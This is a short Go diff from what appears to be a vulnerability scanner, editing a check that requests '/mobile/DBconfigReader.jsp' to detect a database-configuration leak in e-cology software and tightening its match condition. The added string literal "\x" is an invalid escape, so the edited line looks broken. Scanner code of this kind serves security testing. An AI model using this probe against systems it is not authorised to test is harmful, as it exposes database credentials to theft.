@@ -62,7 +62,7 @@ func E_Cology_Database_Leak(u string) bool {
 	header["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
 	if req, err := pkg.HttpRequset(u+"/mobile/DBconfigReader.jsp", "GET", "", false, header); err == nil {
 
-		if req.StatusCode == 200 {
+		if req.StatusCode == 200 && strings.Contains(req.Body, "\x") {
 			body := req.Body
 			s := bytes.Replace([]byte(body), []byte("\r\n"), []byte(""), -1)
 
